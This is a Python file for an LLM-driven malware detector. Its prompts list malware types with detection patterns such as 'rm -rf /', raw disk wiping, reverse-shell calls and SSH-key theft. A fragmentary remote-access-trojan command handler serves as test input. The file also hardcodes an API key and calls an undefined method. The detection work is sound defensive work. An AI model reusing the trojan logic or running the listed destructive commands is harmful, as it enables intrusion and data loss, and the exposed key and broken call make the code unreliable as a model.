import os
from openai import OpenAI
import base64
from google import genai
from openai import types
import json


SYSTEM_PROMPT = """
### ROLE
You are a Static Analysis Security Engine specialized in Supply Chain Malware Detection. Your decisions must be deterministic, evidence-based, and strictly derived from the "ATTACK MATRIX" logic below.

### CORE PHILOSOPHY: THE "MALICIOUS TRIAD" PROOF
To classify a code slice as a "**Full Attack Chain**", you must prove the existence of a complete workflow:
1.  **SOURCE (Origin)**: Where data/trigger comes from (e.g., `os.environ`, `socket`, `clipboard`).
2.  **SINK (Action)**: The dangerous function (e.g., `send`, `exec`, `remove`, `write`).
3.  **RELATION (Data Flow)**: A visible variable path connecting Source to Sink (e.g., `data = Source(); Sink(data)`).

---

### *** COMPREHENSIVE THREAT COMPONENT MATRIX ***

#### [Type A: InfoStealer / Spyware]
*   **Component 1 (Collection):** Explicit reading of Sensitive Data (e.g., `os.environ`, `~/.ssh`, `/etc/passwd`, Browser Cookies, Registry, AWS Tokens).
*   **Component 2 (Exfiltration):** Transmission via Network (e.g., `requests.post`, `socket.send`, `smtplib`, `Telegram/Discord/Slack API`).
*   **RELATION CHECK:** The data being sent MUST be the sensitive data collected.
*   **ANTI-MALWARE RULE (Benign):** 
    - Collecting system specs (CPU, OS, Hostname) for "Telemetry/Crash Report" is BENIGN.
    - Sending data to known legitimate vendors (Sentry, Datadog, Google Analytics) is BENIGN.

#### [Type B: Backdoor / RAT / Reverse Shell]
*   **Component 1 (Connectivity):** Establishment of a Network Socket (Connect-back, Bind Port, or Polling HTTP Beacon).
*   **Component 2 (Execution):** Handing off control to a system shell or code interpreter (e.g., `subprocess.Popen(shell=True)`, `os.dup2` redirection, `exec()`, `os.system()`).
*   **RELATION CHECK:** The input for execution MUST come from the network, OR the output of execution MUST go to the network.
*   **STRICT TRIGGER:** `socket.connect` + `os.dup2` + `subprocess` = **AUTOMATIC FULL CHAIN**.

#### [Type C: Ransomware]
*   **Component 1 (Traversal):** Recursively walking through file system directories (e.g., `os.walk`, `glob`).
*   **Component 2 (Locking):** Reading file content AND (Encrypting [AES/RSA/XOR] OR Overwriting) AND (Deleting original OR Renaming with extension).
*   **MALICIOUS PAYLOAD:** Absence of User Interaction for key management (key is generated/stored remotely or hardcoded).

#### [Type D: Wiper / Sabotage]
*   **Component 1 (Targeting):** Hardcoded paths to Critical System Areas (`/`, `/boot`, `C:\\Windows`, `~`) OR generic "All Files" logic.
*   **Component 2 (Destruction):** Irreversible deletion (`rm -rf`, `unlink`, `shutil.rmtree`) or Raw Disk Overwriting (`dd if=/dev/zero`).
*   **ANTI-MALWARE RULE (Benign):**
    - Functions named `clean_tmp`, `uninstall`, `test_teardown` are BENIGN.
    - Targets inside `/tmp`, `%TEMP%`, `__pycache__` are BENIGN.

#### [Type E: Clipboard Hijacker (Clipper)]
*   **Component 1 (Surveillance):** A loop or event listener monitoring `pyperclip.paste()` or `clipboard.GetText()`.
*   **Component 2 (Manipulation):** Regex pattern matching for Crypto Addresses (ETH `0x...`, BTC `1...`) AND Substitution (`paste(attacker_wallet)`).

#### [Type F: Dropper / Supply Chain Injector]
*   **Component 1 (Payload Staging):**
    - Presence of large Obfuscated Blobs (Base64, Hex) containing executable code.
    - OR Logic checking for "Missing Packages" (Typosquatting behavior).
*   **Component 2 (Persistence/Execution):**
    - Decoding the blob AND Writing to Disk (e.g., `__init__.py`, `Startup` folder).
    - OR Directly executing via `exec(decode(blob))`.

#### [Type G: Logic Bomb]
*   **Component 1 (Guardrail):** Conditional logic based on Date/Time (Timebomb), Specific Hostname/IP, or Domain check (Targeted Attack).
*   **Component 2 (Payload):** Triggering any malicious action from Types A, B, C, D, or F upon satisfaction of the condition.

#### [Type H: Keylogger]
*   **Component 1 (Hooking):** Using libraries like `pynput`, `keyboard`, `GetAsyncKeyState` to capture keystrokes globally.
*   **Component 2 (Leakage):** Writing captures to a hidden file OR sending to Network (Type A logic).
*   **ANTI-MALWARE RULE (Benign):** Code inside a game engine or CLI tool that handles local input for immediate control is BENIGN.

#### [Type I: Resource Hijacking (Miner)]
*   **Component 1 (Activity):** High-load calculation loops or downloading known Miner Binaries (XMRig).
*   **Component 2 (Configuration):** Connecting to Mining Pools (stratum+tcp) or referencing Wallet Addresses in arguments.

---

### CLASSIFICATION DECISION LOGIC

**1. Full Attack Chain (Actionable Threat)**
   - **Requirement**: `Comp 1 (Present) + Comp 2 (Present) + Relation (Proven)`.
   - **Verdict**: The malicious behavior is complete and executable.

**2. Core Attack Chain (High Confidence)**
   - **Scenario A (Broken Link)**: Comp 1 and Comp 2 exist, but data flow is implied/broken due to slicing (e.g., function definition separation).
   - **Scenario B (Visible Payload)**: Only ONE Component exists, BUT it contains a **High-Confidence Malicious Payload**.
     - *Example*: Hardcoded `rm -rf /` (Type D Comp 2) without the loop (Type D Comp 1).
     - *Example*: Hardcoded Reverse Shell String without the socket trigger.
   - **Verdict**: Intent is clearly malicious, but execution path is incomplete in this slice.

**3. Undetermined Call Chain (Low Confidence)**
   - **Requirement**: Contains dangerous functions (e.g., `exec`, `socket`, `requests`) BUT fails the "Malicious Payload" check.
   - **Example**: `exec(user_input)` (Vulnerability, not Malware), or `requests.get(url)` (Benign traffic).
   - **Verdict**: Needs manual review / harmless context.

**4. Benign Artifact (Safe)**
   - **Requirement**: Matches "ANTI-MALWARE RULES" (Test files, Docs, Cleanup scripts) OR no dangerous logic.

### INSTRUCTION FOR ANALYSIS
When analyzing, you must strictly map the code to the **Specific Components** above. 
"""

ASSERTION_PROMPT = """
Analyze the provided code slice: {code_snippet}

### ANALYSIS PROTOCOL (STRICT EXECUTION ORDER)
You must follow these steps sequentially. Do not jump to conclusions.

**STEP 1: BENIGN WHITELIST CHECK (Fail Fast)**
- Is the code explicitly part of a Unit Test (e.g., `unittest`, `mock`, `/tests/`)?
- Is the code a Linter/Formatter/Documentation/Setup Script (standard `setup.py`)?
- Is the dangerous action targeting ONLY safe paths (e.g., deleting `/tmp`, sending data to `sentry.io`)?
-> **IF YES**: Stop analysis. Output `Classification: Benign Artifact`.

**STEP 2: THREAT TYPE SCAN (Component Matching)**
Scan the code against Types A through I defined in the System Prompt. You must identify the **Primary Suspect Type**.
*   **Mandatory Check**: Does the code contain **Component 1** (Source/Trigger) AND **Component 2** (Sink/Action) for this Type?
    - *Constraint*: You must quote the exact code line acting as the component.

**STEP 3: TRIAD PROOF (Relational Analysis)**
If you found both components, verify the link:
1.  **Source**: Where does the data/control come from?
2.  **Sink**: Where does it go?
3.  **Relation (The Critical Link)**: Is there a variable or logic flow connecting Source to Sink? (e.g., `x = Source(); Sink(x)`).
    - *If Relation is broken/invisible due to slicing*: Mark as **Broken Link**.

**STEP 4: PAYLOAD VERIFICATION (The "Malice" Test)**
Analyze the specific data or command being processed.
- **Malicious**: Hardcoded shell commands, grabbing `.ssh` keys, encrypting files.
- **Benign/Generic**: `echo hello`, `ls`, `s.send("ok")`, generic `user_input`.
- **Unknown**: Variable content is not visible (e.g., `exec(blob)`).

---

### CLASSIFICATION LOGIC (Logic Gates)

*   **FULL ATTACK CHAIN** :=
    (Comp 1 Present) **AND** (Comp 2 Present) **AND** (Relation == Verified) **AND** (Payload == Malicious).
    *Note: All 4 conditions must be TRUE.*

*   **CORE ATTACK CHAIN** :=
    *   Case A: (Comp 1 & 2 Present) **BUT** (Relation == Broken/Implied).
    *   Case B: Only One Component Present **BUT** (Payload == High-Confidence Malicious, e.g., hardcoded `rm -rf /` or known Ransomware extension).

*   **UNDETERMINED CALL CHAIN** :=
    (Comp 1 or 2 Present) **BUT** (Payload == Generic/Unknown/Benign).
    *Example: `os.system(cmd)` where `cmd` source is unknown.*

*   **BENIGN ARTIFACT** :=
    Matches Step 1 Whitelist OR No dangerous components found.

---

### FINAL OUTPUT FORMAT (JSON ONLY)
Respond strictly in this JSON format:

{{
  "Step_1_Benign_Check": {{
    "Is_Benign": boolean,
    "Reason": "e.g., 'Target is temp folder' or 'None'"
  }},
  "Step_2_Component_Match": {{
    "Suspect_Type": "Type A / Type B / ... / None",
    "Component_1_Evidence": "Quote the code snippet or 'Missing'",
    "Component_2_Evidence": "Quote the code snippet or 'Missing'"
  }},
  "Step_3_Triad_Proof": {{
    "Source_Variable": "string (or None)",
    "Sink_Function": "string (or None)",
    "Flow_Status": "Verified / Broken / None"
  }},
  "Step_4_Payload_Analysis": {{
    "Content": "Describe what is being executed/sent",
    "Malicious_Verdict": "Confirmed Malicious / Generic / Benign"
  }},
  "Final_Classification": "Full Attack Chain | Core Attack Chain | Undetermined Call Chain | Benign Artifact",
  "Reasoning": "Synthesize the logic gates. Explain exactly why criteria for Full/Core were met or missed."
}}
"""

CHECK_PROMPT = """
You are the **Supreme Logic Auditor**. Your mission is to audit the Analyst's findings and define exactly what is missing to constitute a "Full Attack Chain".

### INPUT DATA
1. **Original Code Slice**:
{code_snippet}

2. **Analyst Report**:
{response}

---

### AUDIT EXECUTION PROTOCOL

**Step 1: Evidence Verification (Hallucination Check)**
- Verify `Component_1_Evidence` and `Component_2_Evidence`.
- **Action**: If the quoted code does NOT exist in the Original Code Slice, mark that Component as **MISSING**.

**Step 2: Logic & Flow Verification**
- Review `Step_3_Triad_Proof` (Source -> Sink Flow).
- **Action**: If the flow logic is "Inferred" or "Broken" (e.g., variables don't match), mark "Relation/Data Flow" as **MISSING**.
- Review `Step_4_Payload_Analysis`.
- **Action**: If the payload is "Generic" (e.g., `os.system(cmd)` without knowing `cmd`) or "Benign", mark "Confirmed Malicious Payload" as **MISSING**.

**Step 3: Gap Analysis (The "Missing Link" Calculation)**
Compare the verified facts against the **FULL ATTACK CHAIN Formula**:
`Full = (Comp 1 Present) + (Comp 2 Present) + (Relation Verified) + (Payload Malicious)`

Identify specifically what is absent:
- Is **Component 1** (Source/Trigger) missing?
- Is **Component 2** (Sink/Action) missing?
- Is the **Relation** (Connection between 1 & 2) broken or unproven?
- Is the **Payload** (The actual malicious content) generic or invisible?

---

### FINAL AUDIT DECISION (JSON ONLY)
Respond strictly in JSON.

{{
  "Audit_Status": "Agreed" | "Overridden",
  "Correction_Reason": "If Overridden, explain strictly based on the missing criteria below.",
  
  "Final_Classification": "Full Attack Chain | Core Attack Chain | Undetermined Call Chain | Benign Artifact",
  
  "Malware_Type": "Type A / ... / None",
  
  "Missing_Criteria_For_Full": [
     "List specific gaps here. Options:",
     "- Component 1 (Source/Trigger) - e.g., Missing network listener",
     "- Component 2 (Sink/Action) - e.g., Missing execution function",
     "- Relation (Data Flow) - e.g., Source variable does not reach Sink",
     "- Malicious Payload - e.g., Command is generic 'ls' or unknown variable",
     "- None (If Full Attack Chain)"
  ],
  
  "Gap_Summary": "A one-sentence explanation of what is needed to upgrade this to Full Chain (e.g., 'Code needs to show where the variable 'cmd' comes from').",
  
  "Confidence_Score": "High/Medium/Low"
}}
"""

class LLM_Evaluate:
    def __init__(self,api_key, base_url):
        self.client = OpenAI(
            api_key=api_key,
            base_url=base_url,
        )
        self.conversation_history = []

    def malware_analyze(self, code_snippet):
        assertion_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": assertion_prompt}
            ],
            temperature=0
        )
        
        response_1 = completion.choices[0].message.content
        # print("Initial LLM Response:")
        # print(response_1)
        check_prompt = CHECK_PROMPT.format(response=response_1, code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": check_prompt}
            ],
            response_format={"type": "json_object"},
            temperature=0
        )
        response_2 = completion.choices[0].message.content
        return json.loads(response_2)  # 解析JSON字符串为Python字典
        
    
    def sensitive_api_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are functions which can lead to malicious activities."
                "if there are, please list the sensitive functions. if not, please reply 'No sensitive functions found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

    
    
    def function_behavior_generate(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to generate its function behavior."
                },
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

if __name__ == "__main__":
    code_snippet = '''
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name ,"wb") as output_file:
        output_file.write(get_response.content)
def send_over_json(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))
def recv_over_json():
    data = ""
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
def shell():
        command = recv_over_json()
        if command == 'q':
        elif command[:2] == 'cd':
                os.chdir(command[3:])
        elif command[:8] == 'download':
            with open(command[9:] ,'rb' ) as file:
                send_over_json(file.read())
        elif command[:6] == 'upload':
            with open(command[7:] ,'wb') as file:
                file_data = recv_over_json()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
                download(command[4:])
                send_over_json("[+] Downloaded File From Specified URL")
                send_over_json("[+] Failed to download that file")
        elif command[:5] == "start":
                subprocess.Popen(command[6:] ,shell=True)
                send_over_json("[+] %s started on victim's machine."%(command[6:]))
                send_over_json("[-] %s failed to start on victim's machine. "%(command[6:]))
            proc = subprocess.Popen(command ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            send_over_json(result.decode('utf-8'))

'''

    llm_evaluate = LLM_Evaluate(
        api_key="1d368dbf-5a67-448f-9356-49f9efa2fc13",
        base_url="https://ark.cn-beijing.volces.com/api/v3"
    )
    sensitive_api_result = llm_evaluate.malicious_assertion(code_snippet)
    print("LLM Malicious Assertion Result:")
    print(sensitive_api_result)